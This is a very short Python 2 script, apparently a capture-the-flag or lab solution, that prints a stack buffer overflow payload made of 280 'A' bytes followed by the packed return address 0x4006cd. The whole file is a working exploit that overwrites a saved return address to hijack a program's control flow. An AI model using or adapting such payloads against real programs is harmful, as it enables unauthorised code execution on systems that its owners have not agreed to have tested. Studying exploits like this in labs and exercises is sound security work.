import struct

padding = "A" * 280
ret = struct.pack("L",0x4006cd)

print padding + ret 